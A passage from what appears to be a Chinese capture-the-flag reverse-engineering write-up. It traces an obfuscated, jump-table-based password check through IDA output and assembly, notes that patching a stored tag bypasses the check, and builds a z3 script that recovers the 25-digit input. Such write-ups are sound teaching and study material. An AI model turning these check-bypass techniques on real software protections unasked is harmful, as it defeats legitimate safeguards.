class="number">0x4AE74C311B803BCELL</span>))(*v20);</span><br><span class="line">  v22 = ((jmptable[<span class="number">6793</span>] - <span class="number">0x6968DD1D9962AB96LL</span>))(*v21);</span><br><span class="line">  v23 = ((jmptable[<span class="number">3692</span>] - <span class="number">0x509873FC4867468ALL</span>))(*v22);</span><br><span class="line">  v25 = <span class="number">0xD5175A4653DE77E3uLL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( **v23 != v870 )</span><br><span class="line">    v25 = <span class="number">0x430CB33E2C4B0D78LL</span>;</span><br><span class="line">  v24 = ((jmptable[<span class="number">7632</span>] + <span class="number">8</span> * (**v23 == v870) - <span class="number">0x6962C35F3447EFD6LL</span>);</span><br><span class="line">  v26 = ((jmptable[<span class="number">7545</span>] + <span class="number">0x1873E89F58DFBBD3LL</span>))(v969, <span class="number">2</span> * (v24 - v25 - (-(__int64)v25 | v24)));</span><br><span class="line">  v862 =((jmptable[<span class="number">16337</span>] - <span class="number">0x298C4B603A684D41LL</span>))(*v26) + <span class="number">16LL</span>);</span><br><span class="line">  v27 = ((jmptable[<span class="number">16878</span>] - <span class="number">0x2B7C07156816338ALL</span>))(v1008);</span><br><span class="line">  ((jmptable[<span class="number">8507</span>] - <span class="number">0x1FB10E1EF8EC55E9LL</span>))(*v27);</span><br><span class="line">  v28 = ((jmptable[<span class="number">4136</span>] + <span class="number">0x75B72F62482D4F4ALL</span>))(v986);</span><br><span class="line">  v29 = ((jmptable[<span class="number">20038</span>] - <span class="number">0x16B95CF58EA2CA9CLL</span>))(*v28);</span><br><span class="line">  v30 = ((jmptable[<span class="number">3020</span>] + <span class="number">0x164FBC31A75BA5EALL</span>))(*v29);</span><br><span class="line">  *(*v30 + <span class="number">48LL</span>) = v872;</span><br><span class="line">  v855 = v1121;</span><br><span class="line">  v856 = *(v1121 + <span class="number">120</span>) == <span class="number">0xBC42D5779FEC401LL</span>;</span><br><span class="line">  v31 = ((jmptable[<span class="number">6403</span>] - <span class="number">0x40A76D8541CD8A6LL</span>))(v1002);</span><br><span class="line">  v857 = <span class="number">2802593464LL</span> * ((jmptable[<span class="number">7643</span>] - <span class="number">0x6A75E0623D0CEDABLL</span>))((*v31) + <span class="number">16LL</span>);</span><br><span class="line">  v859 = <span class="number">4185932529LL</span>;</span><br><span class="line">  v858 = ((<span class="number">2</span> * (v857 % <span class="number">0xF98042F1</span> - ((v857 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF3D44433FuLL</span>)) - <span class="number">0x185777982LL</span>) | (((v857 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF3D44433FuLL</span>) - ((v857 % <span class="number">0xF98042F1</span>) &amp; <span class="number">0x3D44433F</span>))) + ((<span class="number">2</span> * (v857 % <span class="number">0xF98042F1</span> - ((v857 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF3D44433FuLL</span>)) - <span class="number">0x185777982LL</span>) &amp; (((v857 % <span class="number">0xF98042F1</span>) | <span class="number">0xFFFFFFFF3D44433FuLL</span>) - ((v857 % <span class="number">0xF98042F1</span>) &amp; <span class="number">0x3D44433F</span>)));</span><br><span class="line">  v860 = v858 % <span class="number">0xF98042F1</span>;</span><br><span class="line">  v32 = ((jmptable[<span class="number">3849</span>] - <span class="number">0x24D3127B7B323583LL</span>))(v1077);</span><br><span class="line">  *(*v32 + <span class="number">16LL</span>) = v860;</span><br><span class="line">  v33 = ((jmptable[<span class="number">16342</span>] - <span class="number">0x41BC169EC90600F8LL</span>))(v956);</span><br><span class="line">  v34 = ((jmptable[<span class="number">15610</span>] - <span class="number">0x12B6523533755E53LL</span>))(*v33);</span><br><span class="line">  v35 = ((jmptable[<span class="number">20650</span>] + <span class="number">0x4077405EA6064E8LL</span>))(*v34);</span><br><span class="line">  v36 = ((jmptable[<span class="number">5809</span>] - <span class="number">0x5A6B210EDE3F57D4LL</span>))(*v35);</span><br><span class="line">  v861 =((jmptable[<span class="number">10381</span>] + <span class="number">0x56B6C7B34FF33CB1LL</span>))(*v36) + <span class="number">16LL</span>);</span><br><span class="line">  v37 = ((jmptable[<span class="number">18073</span>] + <span class="number">0x776630BB17FA788LL</span>))(v1062);</span><br><span class="line">  v38 = ((jmptable[<span class="number">15280</span>] + <span class="number">0x14D2F36BDEBCF074LL</span>))(*v37);</span><br><span class="line">  ((jmptable[<span class="number">11592</span>] + <span class="number">0x281A6DC4F2A43C68LL</span>))(*v38);</span><br><span class="line">  <span class="keyword">if</span> ( v856 )</span><br><span class="line">  &#123;</span><br><span class="line">    ... 解密逻辑 ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ... 错误逻辑 ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现其中有一些关键数据（比如7499）和一些比较逻辑：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( **v23 != v870 )</span><br><span class="line">  v25 = <span class="number">0x430CB33E2C4B0D78LL</span>;</span><br></pre></td></tr></table></figure>

<p>这里左侧v23是一个定值7499（0x1D4B），右侧是一个随机值（很大，低16位是全零或者1，并且有小概率整个qword都是某固定的14字节乱码的一部分），几乎不可能和左侧相等，而且其生成过程似乎无法在校验函数中定位相关逻辑，校验函数也存在其他方面的难以理解的问题，推断是ida反编译错误，分析汇编（从跳转点开始往上分析）：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>1400021E09 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rbp</span>+<span class="number">2950h</span>+var_2148]</span><br><span class="line"><span class="symbol">.text:</span>1400021E10 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span>1400021E14 <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rax</span>]</span><br><span class="line"><span class="symbol">.text:</span>1400021E17 <span class="keyword">mov</span>     [<span class="built_in">rax</span>+<span class="number">30h</span>], <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span>1400021E1B <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+<span class="number">2950h</span>+var_3C8]</span><br><span class="line"><span class="symbol">.text:</span>1400021E22 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">2950h</span>+var_21D0], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>1400021E29 <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rax</span>+<span class="number">78h</span>]</span><br><span class="line"><span class="symbol">.text:</span>1400021E2D <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="number">0BC42D5779FEC401h</span></span><br><span class="line"><span class="symbol">.text:</span>1400021E37 <span class="keyword">sub</span>     <span class="built_in">rax</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span>1400021E3A <span class="keyword">setz</span>    <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>1400021E3D <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">2950h</span>+var_21C1], <span class="built_in">al</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span><span class="number">1400022115</span> <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">rbp</span>+<span class="number">2950h</span>+var_21C1]</span><br><span class="line"><span class="symbol">.text:</span>140002211B <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">140002211D</span> <span class="keyword">jnz</span>     short loc_7FF7E4E92124</span><br><span class="line"><span class="symbol">.text:</span>140002211F <span class="keyword">jmp</span>     loc_7FF7E4E9795C</span><br></pre></td></tr></table></figure>

<p>发现要让al &#x3D; 1，则必有<font color=lime><strong>[[rbp+2950h+var_3C8]+0x78] &#x3D;&#x3D; 0x0BC42D5779FEC401</strong></font></p>
<p>查看这个位置的值，双击两次后将地址加上0x78发现了一个神秘的int64，应该就是要比较的位置，实测改完之后通过了校验（虽然解密失败），说明这里就是校验位，在这里打上硬件断点，动态调试发现每输入1位这里就被改写一次，大概在<font color=violet><strong>0x140016AD4</strong></font>附近被修改：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>1400015A47 input_pwd:</span><br><span class="line"><span class="symbol">.text:</span>1400015A47 <span class="keyword">call</span>    <span class="built_in">rax</span> <span class="comment">; 输入字符串的地方</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span>1400015E85 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:jmptable+<span class="number">0C6F0h</span></span><br><span class="line"><span class="symbol">.text:</span>1400015E8C <span class="keyword">mov</span>     <span class="built_in">r8</span>, <span class="number">0A2B91DB25EE5355Dh</span></span><br><span class="line"><span class="symbol">.text:</span>1400015E96 <span class="keyword">add</span>     <span class="built_in">rax</span>, <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.text:</span>1400015E99 <span class="keyword">call</span>    <span class="built_in">rax</span> <span class="comment">; 0x1400081760</span></span><br><span class="line"><span class="symbol">.text:</span>1400015E9B <span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rbp</span>+<span class="number">0FC0h</span>+var_948]</span><br><span class="line"><span class="symbol">.text:</span>1400015EA2 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">0FC0h</span>+var_C00], <span class="built_in">rax</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span><span class="number">1400016752</span> <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:jmptable+<span class="number">23D60h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">1400016759</span> <span class="keyword">mov</span>     <span class="built_in">r8</span>, <span class="number">64ED705730BC6591h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">1400016763</span> <span class="keyword">add</span>     <span class="built_in">rax</span>, <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">1400016766</span> <span class="keyword">call</span>    <span class="built_in">rax</span> <span class="comment">; 0x1400081760</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">1400016768</span> <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>140001676B <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+<span class="number">0FC0h</span>+var_C00]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">1400016772</span> <span class="keyword">imul</span>    <span class="built_in">rax</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">1400016776</span> <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">0FC0h</span>+var_C78], <span class="built_in">rax</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span>1400016AC2 <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+<span class="number">0FC0h</span>+var_948] <span class="comment">; 结构体</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AC9 <span class="keyword">mov</span>     <span class="built_in">r9</span>, [<span class="built_in">rbp</span>+<span class="number">0FC0h</span>+var_C78] <span class="comment">; 来源值</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AD0 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, [<span class="built_in">rax</span>+<span class="number">78h</span>] <span class="comment">; tag值</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AD4 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">r9</span> <span class="comment">; 接下来整个是一个add</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AD7 <span class="keyword">not</span>     <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span>1400016ADA <span class="keyword">mov</span>     <span class="built_in">r8</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>1400016<span class="keyword">ADD</span> <span class="keyword">not</span>     <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AE0 <span class="keyword">or</span>      <span class="built_in">r8</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AE3 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AE6 <span class="keyword">add</span>     <span class="built_in">rcx</span>, <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AE9 <span class="keyword">lea</span>     <span class="built_in">r8</span>, [<span class="built_in">r8</span>+<span class="built_in">rcx</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>1400016AEE <span class="keyword">or</span>      <span class="built_in">rdx</span>, <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AF1 <span class="keyword">sub</span>     <span class="built_in">rcx</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AF4 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AF7 <span class="keyword">or</span>      <span class="built_in">rdx</span>, <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AFA <span class="keyword">and</span>     <span class="built_in">rcx</span>, <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.text:</span>1400016AFD <span class="keyword">add</span>     <span class="built_in">rcx</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>1400016B00 <span class="keyword">mov</span>     [<span class="built_in">rax</span>+<span class="number">78h</span>], <span class="built_in">rcx</span> <span class="comment">; 写回tag</span></span><br></pre></td></tr></table></figure>

<p>发现tag的值是来源于每一位分两次带入函数<font color=violet><strong>0x1400081760</strong></font>的返回值相乘之后相加的总和，一共有25位 * 10种 &#x3D; 250个数据</p>
<p>提取250个乘积数据后，编写z3脚本求解：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">TARGET = <span class="number">0x0BC42D5779FEC401</span></span><br><span class="line">MASK64 = (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">matrix_hex = [</span><br><span class="line">    [<span class="number">0x19B3240445AA06</span>,<span class="number">0xF2EB6684284AC</span>,<span class="number">0xC38D14DF6D665</span>,<span class="number">0x1D3A557CD3A980</span>,<span class="number">0x26D8E6DC23319D</span>,<span class="number">0x1C544F24D1B429</span>,<span class="number">0x17F846E0621293</span>,<span class="number">0x1B6E4030F71F3D</span>,<span class="number">0x80F42A7139E80</span>,<span class="number">0x1FCAC56F82739C</span>],</span><br><span class="line">    [<span class="number">0x6F63394844DF78</span>,<span class="number">0x3ED168087F3548</span>,<span class="number">0x6391D7049DDE8</span>,<span class="number">0x8114813C91A610</span>,<span class="number">0xA8FA7B20F1E228</span>,<span class="number">0x786666BE83B978</span>,<span class="number">0x6AE188A0BC46F0</span>,<span class="number">0x6FB9A153C78328</span>,<span class="number">0x1B18D762CB44C8</span>,<span class="number">0x921C4279B1A9A8</span>],</span><br><span class="line">    [<span class="number">0x6DF6A4586E71C0</span>,<span class="number">0x49DE34FFC63EC0</span>,<span class="number">0x39FEE368E99380</span>,<span class="number">0x7A11DE14C79E80</span>,<span class="number">0xD8DC90E996E40</span>,<span class="number">0x7146BFC66E2740</span>,<span class="number">0x680673DB489E00</span>,<span class="number">0x6E31309B7B8940</span>,<span class="number">0x316C3AFCB92AC0</span>,<span class="number">0x82DEEFE21A73C0</span>],</span><br><span class="line">    [<span class="number">0x4EA15FC542C9C0</span>,<span class="number">0x1CA2F34F18CD40</span>,<span class="number">0xA614B2DC1C6980</span>,<span class="number">0x60D84A48824900</span>,<span class="number">0x9280B83FADD240</span>,<span class="number">0x60801A9A7374C0</span>,<span class="number">0x49FE057966CC00</span>,<span class="number">0x579189ABC15440</span>,<span class="number">0xB2F907A133B2C0</span>,<span class="number">0x612F00F6EA6080</span>],</span><br><span class="line">    [<span class="number">0x3AC57453ACE252</span>,<span class="number">0x6229B366FE169</span>,<span class="number">0xACB3FF351198AB</span>,<span class="number">0x4C6C9CDBCE1FE5</span>,<span class="number">0x7C9128173EA742</span>,<span class="number">0x47ED36357FF53C</span>,<span class="number">0x321B2C8DECC760</span>,<span class="number">0x436E1CAD683194</span>,<span class="number">0x97DE278C5E1226</span>,<span class="number">0x489730C9AA7E6A</span>],</span><br><span class="line">    [<span class="number">0x6402164C9FDB19</span>,<span class="number">0x483F192B06217F</span>,<span class="number">0x1E5CB35F54FA69</span>,<span class="number">0x6E1E405C548974</span>,<span class="number">0x137E71B08CA2AA</span>,<span class="number">0x6928A14A143271</span>,<span class="number">0x616EB297EDDB28</span>,<span class="number">0x6431716B60DF88</span>,<span class="number">0x2A4A823D6D822D</span>,<span class="number">0x6E4F38A8434132</span>],</span><br><span class="line">    [<span class="number">0x69B5253875B96</span>,<span class="number">0x2BE31F155AB714</span>,<span class="number">0x21AE09901BF552</span>,<span class="number">0xB221597F1D3D8</span>,<span class="number">0x1556DDAA385C92</span>,<span class="number">0x7D821185844EC</span>,<span class="number">0x462D157005089</span>,<span class="number">0x6B104399CEDBC</span>,<span class="number">0x1E79B0A36CDAFF</span>,<span class="number">0xA266DD02D7453</span>],</span><br><span class="line">    [<span class="number">0x9C0D47EAC35D2D</span>,<span class="number">0x6FD7CB84FD4AD7</span>,<span class="number">0x6255B824338303</span>,<span class="number">0xAC26E207A0A6C5</span>,<span class="number">0x23700DD18B0E3C</span>,<span class="number">0xABD8D1A448644C</span>,<span class="number">0x97F36052CAA668</span>,<span class="number">0xA3F30CB6971D36</span>,<span class="number">0x4F56BF7AFE673B</span>,<span class="number">0x708E71FCEE988</span>],</span><br><span class="line">    [<span class="number">0x30B9DA3C1BFE7</span>,<span class="number">0x16F0557C6F1B97</span>,<span class="number">0x105A5256455ED6</span>,<span class="number">0x575F94A1E493B</span>,<span class="number">0xC0C1389DB1C28</span>,<span class="number">0x4D8773736490A</span>,<span class="number">0x1DC3A46D3EB22</span>,<span class="number">0x43AFA29A5046E</span>,<span class="number">0x12101A50F4E1FB</span>,<span class="number">0x737572378FC07</span>],</span><br><span class="line">    [<span class="number">0x3A03C1D1D02F29</span>,<span class="number">0x255E081F63BA07</span>,<span class="number">0x1B8260C83DD73C</span>,<span class="number">0x4188E0049C9EBA</span>,<span class="number">0x527EEC073C111B</span>,<span class="number">0x3DD8DF72E747E1</span>,<span class="number">0x38195731A5D0AE</span>,<span class="number">0x3A28381B02C813</span>,<span class="number">0x162F7A6E9D784F</span>,<span class="number">0x48C67301DAFECB</span>],</span><br><span class="line">    [<span class="number">0x1D392355DF459C</span>,<span class="number">0xBC35FAA41240</span>,<span class="number">0x4D5BA7B7C6DB28</span>,<span class="number">0x26C6DD80773E62</span>,<span class="number">0x3C52C884071124</span>,<span class="number">0x1FD5838C6C7F50</span>,<span class="number">0x188898B9E96D66</span>,<span class="number">0x1D66839EF1A1C0</span>,<span class="number">0x58A12D4900A2FA</span>,<span class="number">0x2DB81C4AE88D20</span>],</span><br><span class="line">    [<span class="number">0x8484A22A795E4</span>,<span class="number">0x5EB45F3E513AC</span>,<span class="number">0x46247570894A4</span>,<span class="number">0x924CE94DF0690</span>,<span class="number">0x1D5530EA52210</span>,<span class="number">0x920A24B9448D0</span>,<span class="number">0x81027F2A79420</span>,<span class="number">0x8B4887801A9FC</span>,<span class="number">0x35E3DA634FB94</span>,<span class="number">0x928D4D1040ED8</span>],</span><br><span class="line">    [<span class="number">0xBE331DD3107AD</span>,<span class="number">0x5E391DD240E89D</span>,<span class="number">0x39874C7FFB294C</span>,<span class="number">0x15E2AB5E23C478</span>,<span class="number">0x312496AE1C4433</span>,<span class="number">0x1356D94E3C824F</span>,<span class="number">0x6FB9313A4228E</span>,<span class="number">0x10CAFC6DD92AE3</span>,<span class="number">0x409BC32BBA4E37</span>,<span class="number">0x13B66FDE55B77C</span>],</span><br><span class="line">    [<span class="number">0x19C7C11DA4E4A2</span>,<span class="number">0x7FA2B9A827FAE</span>,<span class="number">0x42193CC5270058</span>,<span class="number">0x2043847B9EEDD8</span>,<span class="number">0x2EE265CBAEA1AE</span>,<span class="number">0x1D1555557808F2</span>,<span class="number">0x1820C6CA831F20</span>,<span class="number">0x19E699125F8740</span>,<span class="number">0x3D81E379F6B82A</span>,<span class="number">0x2062F49DA45AB4</span>],</span><br><span class="line">    [<span class="number">0x1796E76685E997</span>,<span class="number">0x5DC0C3E3261CDF</span>,<span class="number">0x3A76362613DD95</span>,<span class="number">0x201BB9EA8ED81C</span>,<span class="number">0x33509B969E3741</span>,<span class="number">0x19EB1C9C94E6A8</span>,<span class="number">0x1368E07F2E794F</span>,<span class="number">0x17BFD098C23630</span>,<span class="number">0x448303CFD4DD31</span>,<span class="number">0x1E41E65B7AFC35</span>],</span><br><span class="line">    [<span class="number">0x9BDC1F78073127</span>,<span class="number">0x75583891352145</span>,<span class="number">0x4F18252739A5AC</span>,<span class="number">0xC857C28BE5198</span>,<span class="number">0x32C55970EA1358</span>,<span class="number">0xC421F0A303C70</span>,<span class="number">0x984973478DC5AC</span>,<span class="number">0x56017C15FBDD1</span>,<span class="number">0x5906717CF6C571</span>,<span class="number">0x1A062A307BCABD</span>],</span><br><span class="line">    [<span class="number">0xCCE53B2DF56140</span>,<span class="number">0x926EC5880F9992</span>,<span class="number">0x81FA523E38B793</span>,<span class="number">0x481AF6CCB653B</span>,<span class="number">0x39FC6F33CB770B</span>,<span class="number">0xDB8605E2F4AA0E</span>,<span class="number">0xC34699DB257145</span>,<span class="number">0xD6872C5CC11542</span>,<span class="number">0x6AD52B4C617CF3</span>,<span class="number">0x12C1CA7EAE79A6</span>],</span><br><span class="line">    [<span class="number">0x1DC6931C286DB2</span>,<span class="number">0xED19AD19480BE</span>,<span class="number">0x3A82193F6EF346</span>,<span class="number">0x23394341031AC0</span>,<span class="number">0x2F828795A6E6BE</span>,<span class="number">0x208D625A5FD472</span>,<span class="number">0x1C635AA6DF8398</span>,<span class="number">0x1DE0F95CF827AE</span>,<span class="number">0x3D2149D449636</span>,<span class="number">0x28782F9453EFDE</span>],</span><br><span class="line">    [<span class="number">0x139D946E9D6D82</span>,<span class="number">0xB0E0C55A4D6238</span>,<span class="number">0x97D9725BE8876E</span>,<span class="number">0x26B598F9022C30</span>,<span class="number">0x51C2FA15841D7E</span>,<span class="number">0x18D5FBE4CDA4C8</span>,<span class="number">0xA3F26DF601552</span>,<span class="number">0x13F8DFF2FE8408</span>,<span class="number">0x8A5498F0183BB0</span>,<span class="number">0x3496095EF45282</span>],</span><br><span class="line">    [<span class="number">0x72A31CFDE71EF6</span>,<span class="number">0x46A5661935D9CA</span>,<span class="number">0xBD4C34161B102</span>,<span class="number">0x82A99A5DE4C84F</span>,<span class="number">0xAE5A988393338F</span>,<span class="number">0x825E0AE4D3D5F5</span>,<span class="number">0x6E8EA108204593</span>,<span class="number">0x7A7FE273C35A4C</span>,<span class="number">0x172C91B106B2ED</span>,<span class="number">0x82F69B85B1A2A1</span>],</span><br><span class="line">    [<span class="number">0x40A5DB3578D586</span>,<span class="number">0x22F572E6839826</span>,<span class="number">0x1133B875BED53A</span>,<span class="number">0x4A9B4A38CF1460</span>,<span class="number">0x65C33E4F5A2FC0</span>,<span class="number">0x481234127842A2</span>,<span class="number">0x3BC3C87F8C0454</span>,<span class="number">0x4588CE32DCF25A</span>,<span class="number">0x573D341F00D72</span>,<span class="number">0x48724D79B38078</span>],</span><br><span class="line">    [<span class="number">0xC427156A9E2860</span>,<span class="number">0x88B763CB6FB9F0</span>,<span class="number">0x2F08D6E954E096</span>,<span class="number">0xD9CCF65D9CD7A4</span>,<span class="number">0x17C3E165050BF0</span>,<span class="number">0xCF2B002B1AD140</span>,<span class="number">0xBEA37CEF15E1FA</span>,<span class="number">0xC48CEE7BAE850C</span>,<span class="number">0x489420271C9606</span>,<span class="number">0xDA31DC2C7FDBCE</span>],</span><br><span class="line">    [<span class="number">0x537869C92A42D0</span>,<span class="number">0x1DA1D095B7C0B4</span>,<span class="number">0xBF7B1F10223116</span>,<span class="number">0x6586F47FC6CF52</span>,<span class="number">0x8E40676E4927E0</span>,<span class="number">0x58692F2E100A24</span>,<span class="number">0x4A9CA491835636</span>,<span class="number">0x53CFDDBDD2F61C</span>,<span class="number">0xB2B5098A832538</span>,<span class="number">0x619C35508AEABA</span>],</span><br><span class="line">    [<span class="number">0x8CC856E432BC50</span>,<span class="number">0x62360169143A78</span>,<span class="number">0x55333012D9DD23</span>,<span class="number">0x9C4964E3F15005</span>,<span class="number">0x18A07DDC589B2C</span>,<span class="number">0x9BFE0FEDBF05DC</span>,<span class="number">0x88D54339CF6CF1</span>,<span class="number">0x9463624AACA2C6</span>,<span class="number">0x42E7AF41E9BD7C</span>,<span class="number">0xAB36B7C0777858</span>],</span><br><span class="line">    [<span class="number">0x20CCD008AD41A</span>,<span class="number">0x3684BCD9A0F789</span>,<span class="number">0x2525F943737B70</span>,<span class="number">0x86BB1A4A4AA7D</span>,<span class="number">0x19CA34ADEE1B3A</span>,<span class="number">0x6CC51DF5A1F44</span>,<span class="number">0x4661D5224E5470</span>,<span class="number">0x52CED44ED58CC</span>,<span class="number">0x29A7CADA9C4CB1</span>,<span class="number">0xD0CB5244CA7FD</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">matrix = [[<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> row] <span class="keyword">for</span> row <span class="keyword">in</span> matrix_hex]</span><br><span class="line">solver = Solver()</span><br><span class="line">choices = [Int(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    solver.add(choices[i] &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(choices[i] &lt;= <span class="number">9</span>)</span><br><span class="line">sum_expr = BitVecVal(<span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    val = BitVecVal(matrix[i][<span class="number">0</span>], <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>): val = If(choices[i] == j, BitVecVal(matrix[i][j], <span class="number">64</span>), val)</span><br><span class="line">    sum_expr = sum_expr + val</span><br><span class="line">solver.add(sum_expr == TARGET)</span><br><span class="line"><span class="built_in">print</span>(<span 